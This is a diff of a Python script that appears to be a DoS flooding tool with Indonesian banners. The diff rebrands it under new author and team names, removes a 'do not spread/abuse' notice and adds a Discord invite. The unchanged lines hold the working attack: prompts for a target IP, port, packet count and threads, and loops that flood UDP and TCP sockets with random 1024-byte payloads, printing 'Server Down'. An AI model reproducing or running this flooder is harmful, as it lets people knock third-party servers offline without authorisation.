@@ -22,20 +22,20 @@ print("""\033[93m
                       ███ ░███
                      ░░██████
                       ░░░░░░
-             \033[93m>> \033[96mPrivate Tools By TanzZ \033[93m<<
+             \033[93m>> \033[96mPrivate Tools By Gada Lu Bau#8688 \033[93m<<
             \033[97m
    ███
   █   █
-\033[97m  █   █                      \033[93m TolsBuriqqq
-\033[97m█████████               ██   \033[93m Sangat Amat Tols Buriq Di Jual? Yatim Eh Canda
-\033[97m█████████              █  █  \033[93m Tols Ini Tidak Boleh Di JuaL/Di Sebar Ya Mek
+\033[97m  █   █                      \033[93m Dosen't have account? DM Gada Lu Bau#8688
+\033[97m█████████               ██   \033[93m Or You Can Just Join Our Discord Server, Link??
+\033[97m█████████              █  █  \033[93m https://dsc.gg/pornhub \033[97m
 \033[97m███   ███ ██████████████  █
 \033[97m████ ████ █ █          █  █
 \033[97m█████████               ██     \033[33m
 
 """)
-username = str(input("\033[33m[TolsOpTanzZ] \033[93mUsername:"))
-password = str(input("\033[33m[TolsOpTanzZ] \033[93mPassword:"))
+username = str(input("\033[33m[GadaLuBau] \033[93mUsername:"))
+password = str(input("\033[33m[GadaLuBau] \033[93mPassword:"))
 if password == "2009" and username == "Juni":
     print ("Logged in as admin")
     time.sleep(2)
@@ -68,22 +68,22 @@ os.system("clear")
 print("""
   ____           _         _            ____
  / ___| __ _  __| | __ _  | |   _   _  | __ )  __ _ _   _  
-| |  _ / _` |/ _` |/ _` | | |  | | | | |  _ \ / _` | | | | [+] Author  : TanzzCok
-| |_| | (_| | (_| | (_| | | |__| |_| | | |_) | (_| | |_| | [+} Bismillah DuluBiarHalal
- \____|\__,_|\__,_|\__,_| |_____\__,_| |____/ \__,_|\__,_| [+] Team    : TanzZ
+| |  _ / _` |/ _` |/ _` | | |  | | | | |  _ \ / _` | | | | [+] Author  : Gada Lu Bau#8688
+| |_| | (_| | (_| | (_| | | |__| |_| | | |_) | (_| | |_| | [+] Youtube : Gada Lu Bau
+ \____|\__,_|\__,_|\__,_| |_____\__,_| |____/ \__,_|\__,_| [+] Team    : SlayerEx+
 """)
 print("""
 ___________________________________________
 
 >>>>>Kalau Mau Pakek Ganteng Dulu<<<<<")
->>>>>Please Not Abuse Tols<<<<<
+>>>>>Mau rename? PM me<<<<<
 ___________________________________________
 """)
-ip = str(input("[+] TanzZGanteng | Ip:"))
-port = int(input("[+] TanzZGanteng | Port:"))
-choice = str(input("[+] TanzZGanteng | Gas Gak Ni?(y/n):"))
-times = int(input("[+] TanzZGanteng | Packets:"))
-threads = int(input("[+] TanzZGanteng | Threads:"))
+ip = str(input("[+] SlayerEx | Ip:"))
+port = int(input("[+] SlayerEx | Port:"))
+choice = str(input("[+] SlayerEx | Gas Gak Ni?(y/n):"))
+times = int(input("[+] SlayerEx | Packets:"))
+threads = int(input("[+] SlayerEx | Threads:"))
 def run():
 	data = random._urandom(1024)
 	i = random.choice(("[*]","[!]","[#]"))
@@ -93,7 +93,7 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" | TanzzAnakBaik |")
+			print(i +" | SlayerEx |")
 		except:
 			print("[!] | Server Down!!! |")
 
@@ -107,7 +107,7 @@ def run2():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +" Ezz Banget Sih Dek Dek + !!!")
+			print(i +" SlayerEx Nih Bos!!!")
 		except:
 			s.close()
 			print("[*] Down Lagi Nih")
